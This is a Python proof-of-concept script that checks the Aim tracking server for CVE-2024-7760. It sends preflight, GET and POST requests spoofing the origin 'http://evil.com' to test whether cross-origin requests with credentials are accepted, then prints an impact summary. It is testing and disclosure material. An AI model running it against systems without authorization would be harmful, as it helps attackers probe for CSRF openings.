#!/usr/bin/env python3
"""
CVE-2024-7760 - CSRF vulnerability in aimhubio/aim v3.22.0
The tracking server allows cross-origin requests from all origins,
enabling CSRF attacks on all endpoints.
"""

import requests
import sys


def verify_csrf_vulnerability(target_host="http://localhost:43800"):
    print(f"[*] Testing CVE-2024-7760 CSRF vulnerability on {target_host}")
    
    evil_origin = "http://evil.com"
    
    # Test 1: OPTIONS preflight request
    print("\n[*] Test 1: Checking CORS preflight response")
    try:
        resp = requests.options(
            f"{target_host}/api/experiments/",
            headers={
                "Origin": evil_origin,
                "Access-Control-Request-Method": "GET"
            },
            timeout=10
        )
        
        cors_origin = resp.headers.get("Access-Control-Allow-Origin", "")
        cors_credentials = resp.headers.get("Access-Control-Allow-Credentials", "")
        
        print(f"    Access-Control-Allow-Origin: {cors_origin}")
        print(f"    Access-Control-Allow-Credentials: {cors_credentials}")
        
        if cors_origin == evil_origin and cors_credentials.lower() == "true":
            print("[+] VULNERABLE: Server allows cross-origin requests with credentials from any origin")
        else:
            print("[-] Not vulnerable or CORS is properly configured")
            return False
    except Exception as e:
        print(f"[-] Error during preflight test: {e}")
        return False
    
    # Test 2: Actual cross-origin GET request
    print("\n[*] Test 2: Simulating cross-origin GET request")
    try:
        resp = requests.get(
            f"{target_host}/api/experiments/",
            headers={"Origin": evil_origin},
            timeout=10
        )
        
        cors_origin = resp.headers.get("Access-Control-Allow-Origin", "")
        
        print(f"    Status: {resp.status_code}")
        print(f"    Access-Control-Allow-Origin: {cors_origin}")
        
        # CORS allows * or specific origin - both are exploitable
        if cors_origin == evil_origin or cors_origin == "*":
            print("[+] Cross-origin GET request allowed")
        else:
            print("[-] Cross-origin GET request blocked")
            return False
    except Exception as e:
        print(f"[-] Error during GET test: {e}")
        return False
    
    # Test 3: Cross-origin POST request (simulating CSRF action)
    print("\n[*] Test 3: Simulating cross-origin POST request (CSRF attack)")
    try:
        resp = requests.post(
            f"{target_host}/api/experiments/",
            headers={
                "Origin": evil_origin,
                "Content-Type": "application/json"
            },
            json={},
            timeout=10
        )
        
        cors_origin = resp.headers.get("Access-Control-Allow-Origin", "")
        
        print(f"    Status: {resp.status_code}")
        print(f"    Access-Control-Allow-Origin: {cors_origin}")
        
        if cors_origin == evil_origin or cors_origin == "*":
            print("[+] Cross-origin POST request allowed - CSRF attack possible")
    except Exception as e:
        print(f"[-] Error during POST test: {e}")
    
    print("\n" + "="*60)
    print("[+] CVE-2024-7760 VULNERABILITY CONFIRMED!")
    print("="*60)
    print("\nImpact:")
    print("  - Attacker can perform CSRF attacks on all tracking server endpoints")
    print("  - Can be chained with RCE, DoS, arbitrary file read/write vulnerabilities")
    print("  - Any malicious website can make authenticated requests on behalf of users")
    
    return True


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:43800"
    success = verify_csrf_vulnerability(target)
    sys.exit(0 if success else 1)
